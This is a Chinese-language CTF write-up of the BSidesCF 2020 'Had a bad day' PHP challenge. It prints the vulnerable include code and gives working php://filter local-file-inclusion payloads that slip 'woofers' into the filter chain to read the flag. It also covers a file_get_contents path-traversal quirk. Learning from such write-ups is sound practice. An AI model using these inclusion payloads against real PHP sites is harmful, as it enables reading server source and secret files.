# \[BSidesCF 2020]Had a bad day

## \[BSidesCF 2020]Had a bad day

## 考点

* 文件包含配合伪协议读取文件
* php://filter伪协议特性
* file\_get\_contents特性

## wp

![](<../../.gitbook/assets/image (4) (1) (1).png>)

两个按钮，点一下，页面跳转到index.php?category=woofers

尝试php伪协议文件包含，`index.php?category=php://filter/read=convert.base64-encode/resource=index.php`，得到报错无法包含<mark style="color:red;">index.php.php</mark>

![](<../../.gitbook/assets/image (9) (1) (1) (1).png>)

改一下payload，`index.php?category=php://filter/read=convert.base64-encode/resource=index`

```php
<?php
$file = $_GET['category'];
if(isset($file))
{
if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
            include ($file . '.php');
}else{
echo "Sorry, we currently only support woofers and meowers.";
}
}
?>
```

要包含的文件名中必须含有woffers或meowers或index

这里就用php://filter伪协议的特性，可以在协议上套一层协议，并且遇到识别不了的会自动过滤

`index.php?category=php://filter/convert.base64-encode/write=woofers/resource=flag`

`index.php?category=php://filter/convert.base64-encode/woofers/resource=flag`

## 小结

1. php://filter伪协议遇到识别不了的协议或过滤器会自动过滤，比如`php://filter/convert.base64-encode/write=woofers/resource=flag`会自动过滤`write=woofers`
2. file\_get\_contents在遇到无法识别的协议时，会把它当做目录处理

```php
$a = file_get_contents("a/://github/../../../2.txt");
echo $a;
$a = file_get_contents("http(://github/../../2.txt");
echo $a;
// 123
```

目录结构如下

* index.php
* 2.txt
